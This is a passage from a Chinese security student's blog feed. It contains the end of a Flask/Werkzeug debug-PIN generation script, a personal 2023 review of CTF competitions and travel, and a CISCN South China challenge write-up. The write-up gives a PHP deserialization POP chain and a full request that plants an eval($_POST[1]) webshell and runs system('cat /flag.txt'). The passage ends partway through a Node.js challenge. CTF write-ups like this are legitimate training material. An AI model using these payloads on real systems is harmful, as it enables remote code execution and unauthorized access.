<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;95532399935&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c896209336caea5879454a97252d24dfa2e02dc6f3ca12b95c96ca78f524f4f87e9b26&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 要成为想成为的人</title>
    <url>/2023-Final/</url>
    <content><![CDATA[<p>看着朋友们都在分享二零二三年的点点滴滴，我的分享欲也开始作祟，于是有了这篇文章。</p>
<p>首先是很喜欢的一首歌，“你会静默，手握着星火等在至暗时刻”。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" style="margin-left: 0" src="https://music.163.com/outchain/player?type=2&amp;id=1818819577&amp;auto=0&amp;height=66">
</iframe>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>这一年身体意外的差，大抵是新冠后遗症带来的后果吧，特别是二阳后，几乎每个月就要发一次高烧，然后躺在床上近十天。</p>
<p>都说报喜不报忧，因此也不愿告诉父母我的近况，只是偶尔精神几乎崩溃的时候，流着眼泪给妈妈发消息“我好想你”。</p>
<p>此前一直在思考自己是不是生性凉薄，现在才明白只是习惯用学习和工作把自己淹没，好让精神决堤的没那么快。</p>
<p>近来有一些得闲，然后就开始胡思乱想和焦虑未来。</p>
<p>我曾幻想过很多种诗和远方，考虑过要读博，去海外学习，想象着“会当凌绝顶，一览众山小”，期待着“春风得意马蹄疾，一日看尽长安花”。</p>
<p>但是当我孤身一人在医院瘫倒在急诊门口的时候，我已经不想去远方了。</p>
<h1 id="新年-flag">新年 FLAG</h1>
<ul class="task-list">
<li><label><input
type="checkbox" />坚持健身【我已经有腹肌了我已经有腹肌了我已经有腹肌了</label></li>
<li><label><input type="checkbox" />坚持练字</label></li>
<li><label><input type="checkbox" />论文 x1</label></li>
<li><label><input type="checkbox" />专利 x1</label></li>
<li><label><input type="checkbox" />雅思过
<strong>7</strong></label></li>
<li><label><input type="checkbox" />看极光</label></li>
<li><label><input type="checkbox" />看雪山</label></li>
<li><label><input type="checkbox" />多看一些书来充实自己</label></li>
<li><label><input type="checkbox" /><del>早睡早起</del></label></li>
</ul>
<h1 id="接下来要做的事">接下来要做的事</h1>
<p>新的一年考虑把重心放在 <strong>AI</strong> 上面，还在摸索中。</p>
<p><strong>CTF</strong> 打算就看看国际赛。</p>
<p>多读多发一些论文阅读笔记。</p>
<h1 id="一些时间锚点">一些时间锚点</h1>
<p><strong>TEL</strong>: 云安全研究员。</p>
<p><img src="/images/2023-Final/IMG_8751.webp" /></p>
<h2 id="武夷山-天游峰">2.18 武夷山 天游峰</h2>
<p>看山。</p>
<p><img src="/images/2023-Final/image-20240107143810416.webp" /></p>
<h2 id="香港-五月天">4.14 香港 五月天</h2>
<p>票到了通行证没到，但是就当我去过了吧。</p>
<p><img src="/images/2023-Final/image-20240107143520059.webp" /></p>
<p><img src="/images/2023-Final/IMG_4231.webp" /></p>
<h2 id="福州-信息安全铁人三项赛-二等奖">4.27 福州 信息安全铁人三项赛
二等奖</h2>
<p>傻逼某普，打个比赛交了两波材料审核，最后决赛二等奖了跑过来说研究生不能打，要取消成绩，早干嘛去了，这是给我钓鱼来了？</p>
<p>属实低能，一群人内网穿透出去找外援没管，录屏也不审核，屏蔽仪也不开。</p>
<p>来个裁判拽的跟个二五八万一样张口国安闭口院士的，好像我是什么国际逃犯一样。</p>
<p>就你认识国安认识院士一样，人家认识你么搁这儿装大象。</p>
<h2 id="厦门">5.3 厦门</h2>
<p>想念一些人。</p>
<p><img src="/images/2023-Final/image-20240107143857660.webp" /></p>
<h2 id="上饶-xctf-饶派杯车联网-优秀奖">5.30 上饶 XCTF 饶派杯车联网
优秀奖</h2>
<p>急死了，<strong>destruct</strong>
反序列化死活没出，给队友拖后腿了，吃了优秀奖保底。</p>
<h2 id="重庆">6.1 重庆</h2>
<p>感觉每天都在吃火锅，还有这儿人是真多。</p>
<p><img src="/images/2023-Final/IMG_5101.webp" /></p>
<h2 id="大理">6.10 大理</h2>
<p>喜欢这个城市。</p>
<p><img src="/images/2023-Final/image-20240107144001049.webp" /></p>
<p>面朝大海，我站成了大海。</p>
<p><img src="/images/2023-Final/image-20240107144035073.webp" /></p>
<h2 id="桂林-ciscn-华南半决赛-一等奖">6.24 桂林 CISCN 华南半决赛
一等奖</h2>
<p>第二名，全是 <strong>JS</strong> 的题，没咋学过，得补补课了。</p>
<p><img src="/images/2023-Final/image-20240107143143294.webp" /></p>
<h2 id="长沙-方班五周年">7.23 长沙 方班五周年</h2>
<p>和方老师合了影。</p>
<figure>
<img src="/images/2023-Final/IMG_8803.webp" alt="IMG_8803" />
<figcaption aria-hidden="true">IMG_8803</figcaption>
</figure>
<p><img src="/images/2023-Final/IMG_5953.webp" /></p>
<h2 id="合肥-ciscn-全国总决赛-二等奖">7.24 合肥 CISCN 全国总决赛
二等奖</h2>
<p><strong>AWD</strong> 拉胯，打得手忙脚乱的，渗透也拉胯，没看见域。</p>
<p>好想拿一次一等奖。</p>
<p><img src="/images/2023-Final/image-20240107143231485.webp" /></p>
<h2 id="成都-巅峰极客总决赛-巅峰人才">8.23 成都 巅峰极客总决赛
巅峰人才</h2>
<p>第一次在 <strong>S1uM4i</strong> 打线下赛，和
<strong>TEL、Fr3Nky、Me7eorite</strong> 坐牢调了一天 <strong>Chrome
RCE</strong>，我好菜。</p>
<p>有人内网穿透找外援，恶心，某宁这信号屏蔽仪不太行。</p>
<p>最后第七名，又吃保底。</p>
<p><img src="/images/2023-Final/image-20240107143101382.webp" /></p>
<p>借机去了理塘圆梦，可惜天气不好，没看见贡嘎雪顶。</p>
<p><img src="/images/2023-Final/image-20240107142650092.webp" /></p>
<h2 id="澳门-访学-ijcai-2023">8.25 澳门 访学 IJCAI 2023</h2>
<p>希望我也能中一篇。</p>
<p>澳门消费真的好高。</p>
<p><img src="/images/2023-Final/image-20240107141242226.webp" /></p>
<h2 id="广州-羊城杯决赛-一等奖">9.10 广州 羊城杯决赛 一等奖</h2>
<p>线上线下都是第一名，开心。</p>
<p><img src="/images/2023-Final/image-20240107141415348.webp" /></p>
<p>和 <strong>TEL、xiao</strong> 还有 <strong>taolve</strong>
一起打的，半场就开香槟一起看动画片了。</p>
<p><img src="/images/2023-Final/image-20240107141429107.webp" /></p>
<p>信号屏蔽仪开这么猛了还有人能把题传出去，牛逼。</p>
<h2 id="贵州-蓝帽杯半决赛-晋级">9.16 贵州 蓝帽杯半决赛 晋级</h2>
<p>傻逼某信的取证题题意不明，找管理员给个说法就装死，别办比赛了，天天搁这儿恶心人。</p>
<p>特么得 <strong>SHA256-RSA</strong> 和 <strong>SHA256withRSA</strong>
不是一回事吗？</p>
<p>没启动记录的软件也算使用过？</p>
<p>不够严谨，影响办案，建议晶哥别用他们公司的软件。</p>
<h2 id="上海-武数杯决赛-优秀奖">10.15 上海 武数杯决赛 优秀奖</h2>
<p>吃保底了，唉。</p>
<p><strong>AWDP WEB</strong> 坐大牢，一题也不会。</p>
<p>渗透赛也拉胯了，不会云原生，该补补了，<strong>RBCD</strong>
约束委派也不熟练。</p>
<p><img src="/images/2023-Final/image-20240107141832988.webp" /></p>
<p>和 <strong>TEL</strong> 还有 <strong>CSOME</strong>
一起去的，定了电竞酒店玩了半天猛兽派对。</p>
<p>去了米哈游总部。</p>
<p><img src="/images/2023-Final/image-20240107141903493.webp" /></p>
<p>和南科大山大的师傅们一起吃了海底捞和自助。</p>
<p><img src="/images/2023-Final/image-20240107141854308.webp" /></p>
<h2 id="北京-蓝帽杯总决赛-一等奖">10.30 北京 蓝帽杯总决赛 一等奖</h2>
<p>第二名。</p>
<p><img src="/images/2023-Final/image-20240107141806059.webp" /></p>
<p>某信真的脑瘫，谁同意你把所有人的姓名和手机号全部打印出来放在参赛手册上了？</p>
<p>明年再打是狗，垃圾公司怎么还不倒闭，某数字比你好一百倍。</p>
<h2 id="杭州-cpipc-总决赛-二等奖">11.11 杭州 CPIPC 总决赛 二等奖</h2>
<p>唉，什么时候能在大比赛拿一等奖呀。</p>
<p>发着烧去的，头太晕了【给自己找补。</p>
<p>傻逼某城，做的什么靶场？我就没上传成功过。</p>
<p><strong>AWDP</strong> 开场两分钟只有某校猛猛 <strong>FIX</strong>
五题，别的学校一个多小时才搞明白。</p>
<p>渗透又拉胯了，明明本地存了 <strong>EXP</strong>，却是想不起来。</p>
<h2 id="深圳-鹏城杯决赛-二等奖">11.16 深圳 鹏城杯决赛 二等奖</h2>
<p>唉，想拿第一名。</p>
<p>和 <strong>Char0n、TEL、Frank</strong> 一起打的，渗透坐牢三天。</p>
<p>傻逼鹏城，出了题 ssh 弱密码的 pwn 非预期，三百分。</p>
<p>和第一名就差三十分，加上这三百我就是第一名了。</p>
<p><img src="/images/2023-Final/image-20240107141709203.webp" /></p>
<p><img src="/images/2023-Final/image-20240107141740907.webp" /></p>
<h2 id="中山-香山杯决赛-二等奖">11.17 中山 香山杯决赛 二等奖</h2>
<p>又是第二名，可恶，什么时候才能拿第一名呀。</p>
<p>我在鹏城，<strong>TEL</strong> 去双开了，好辛苦，来回跑。</p>
<p><img src="/images/2023-Final/image-20240107141726603.webp" /></p>
<h2 id="北京-京麒总决赛-三等奖">12.02 北京 京麒总决赛 三等奖</h2>
<p>太冷了浑浑噩噩的，没赶上 <strong>solo</strong>
的分，而且有非预期。</p>
<p>可恶，又是非预期，真恶心，又差一点二等奖，拿了保底的三等奖。</p>
<p><img src="/images/2023-Final/image-20240107142938919.webp" /></p>
<h2 id="北京-信工所-清华大学-北京大学">12.03 北京 信工所 &amp; 清华大学
&amp; 北京大学</h2>
<p>和 <strong>hpdoger</strong> 吃了饭。</p>
<p>找 <strong>xuanxuan</strong> 和 <strong>Q1IQ</strong>
分别预约了清华北大，和 <strong>XMAN</strong> 逛了一天，开心。</p>
<p><img src="/images/2023-Final/image-20240107144257384.webp" /></p>
<p><img src="/images/2023-Final/image-20240107144311167.webp" /></p>
<h2 id="南京-拟态防御总决赛">12.06 南京 拟态防御总决赛</h2>
<p><strong>AI</strong> 第六名，<strong>Mobile</strong>
第三名，车联网，第十五名。</p>
<p>奖杯是随便发的，让我们领完奖下去自己换。</p>
<p><img src="/images/2023-Final/image-20240107141604541.webp" /></p>
<p>甲流高烧瘫在酒店远程打，难受。</p>
<p>大吉北！</p>
<p><img src="/images/2023-Final/image-20240107144209204.webp" /></p>
<h2 id="广州-冬至">12.24 广州 冬至</h2>
<p>和
<strong>GZ、TEL、Zhengtai、XMAN、</strong>春哥一起吃饭看电影了。</p>
<p><img src="/images/2023-Final/image-20240107144821702.webp" /></p>
<p>改磕兰哀了。</p>
<p><img src="/images/2023-Final/image-20240107144911972.webp" /></p>
]]></content>
      <categories>
        <category>闲聊</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 第十六届全国大学生信息安全竞赛 创新实践能力赛 华南赛区 部分题解</title>
    <url>/2023-CISCN-SOUTH/</url>
    <content><![CDATA[<p>下了三天雨，啥也没看着。</p>
<span id="more"></span>
<h1 id="city_pop">city_pop</h1>
<p>提示了 <strong>pop.php</strong>。</p>
<p><strong>filter</strong> 替换 <strong>getflag</strong> 为
<strong>hark</strong>，少了两个字符，而 <strong>Start</strong>
方法无法传参对象，因此猜测是反序列化逃逸。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;getflag&quot;</span>,<span class="string">&#x27;hark&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span>,<span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end=<span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Go</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;ray;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Get</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Done</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eval</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$use</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$useless</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">use</span>=$<span class="title">this</span>-&gt;<span class="title">useless</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">eval</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">eval</span>=<span class="string">&#x27;no way&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ciscn_huaibei.pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span>=<span class="keyword">new</span> <span class="title function_ invoke__">start</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ciscn_huaibei.pop&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ser</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>));</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="pop-链构造">POP 链构造</h2>
<p>思路是 <strong>Go</strong> 的 <strong>destruct</strong> 调用
<strong>Get</strong> 的 <strong>toString</strong>，然后跳转
<strong>get</strong> 最后到 <strong>Done</strong> 的
<strong>invoke</strong>。</p>
<p>而 <strong>Done</strong> 中有 <strong>wakeup</strong> 对
<strong>eval</strong> 进行了覆写，因此将赋值 <strong>use</strong> 地址给
<strong>eval</strong>，通过对 <strong>use</strong> 赋值来更改
<strong>eval</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Go</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Get</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Done</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eval</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$use</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$useless</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Done</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="keyword">use</span> =&amp; $<span class="title">d</span>-&gt;<span class="title">eval</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="keyword">eval</span> = <span class="string">&#x27;no way&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span>-&gt;useless = <span class="string">&quot;eval(\$_POST[1]);&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="keyword">use</span> = $<span class="title">d</span>-&gt;<span class="title">useless</span>;</span><br><span class="line"><span class="variable">$get</span> = <span class="keyword">new</span> <span class="title class_">Get</span>(<span class="keyword">new</span> <span class="title class_">Get</span>(<span class="string">&quot;1&quot;</span>, <span class="variable">$d</span>), <span class="string">&quot;phpinfo()&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$go</span> = <span class="keyword">new</span> <span class="title class_">Go</span>;</span><br><span class="line"><span class="variable">$go</span>-&gt;ray = <span class="variable">$get</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Start</span>(<span class="string">&#x27;getflaggetflaggetflaggetflaggetflaggetflag&#x27;</span>, <span class="variable">$go</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;Start&quot;:2:&#123;s:5:&quot;start&quot;;s:42:&quot;getflaggetflaggetflaggetflaggetflaggetflag&quot;;s:3:&quot;end&quot;;O:2:&quot;Go&quot;:1:&#123;s:3:&quot;ray&quot;;O:3:&quot;Get&quot;:2:&#123;s:4:&quot;func&quot;;s:9:&quot;phpinfo()&quot;;s:4:&quot;name&quot;;O:3:&quot;Get&quot;:2:&#123;s:4:&quot;func&quot;;O:4:&quot;Done&quot;:4:&#123;s:4:&quot;eval&quot;;s:10:&quot;phpinfo();&quot;;s:5:&quot;class&quot;;N;s:3:&quot;use&quot;;R:8;s:7:&quot;useless&quot;;s:10:&quot;phpinfo();&quot;;&#125;s:4:&quot;name&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="字符变量传参">字符变量传参</h2>
<p>对于 <strong>ciscn_huaibei.pop</strong> 这个传参来说，<strong><a
href="https://github.com/php/php-src/blob/PHP-7.3.4/main/php_variables.c#L192">PHP</a></strong>
在遇到 <strong>[</strong> 的时候，如果没有匹配到接下来的
<strong>]</strong>，则会替换其为 <strong>_</strong>，然后直接
<strong>return</strong> 不管后面了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ip = <span class="built_in">strchr</span>(ip, <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!ip) &#123;</span><br><span class="line">    <span class="comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span></span><br><span class="line">    *(index_s - <span class="number">1</span>) = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    index_len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (index) &#123;</span><br><span class="line">        index_len = <span class="built_in">strlen</span>(index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> plain_var;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结">总结</h2>
<p>直接构造。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST http://172.1.14.1/pop.php?ciscn[huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflag&amp;pop=;s:3:%22end%22;O:2:%22Go%22:1:&#123;s:3:%22ray%22;O:3:%22Get%22:2:&#123;s:4:%22func%22;s:9:%22phpinfo()%22;s:4:%22name%22;O:3:%22Get%22:2:&#123;s:4:%22func%22;O:4:%22Done%22:4:&#123;s:4:%22eval%22;s:16:%22eval($_POST[1]);%22;s:5:%22class%22;N;s:3:%22use%22;R:8;s:7:%22useless%22;s:16:%22eval($_POST[1]);%22;&#125;s:4:%22name%22;s:1:%221%22;&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">1=system(&#x27;cat /flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
<h1 id="emoji">emoji</h1>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs=<span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParse = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pugjs=<span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">IfLogin</span>(<span class="params">req, res, next</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">admin=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;😍😂😍😒😘💕😁🙌&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">app=<span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParse.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="string">&#x27;legend of zelda : tears of kingdom&#x27;</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="title class_">IfLogin</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;if you want flag .then go to /admin ,and find a way to get it . no pain, no gain !&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">user</span>)</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> username=req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">var</span> password=req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">    <span class="keyword">if</span>(username||password)&#123;</span><br><span class="line">        <span class="keyword">if</span>(username.<span class="title function_">includes</span>(<span class="string">&#x27;ad&#x27;</span>))&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;you not the true admin&#x27;</span>)</span><br><span 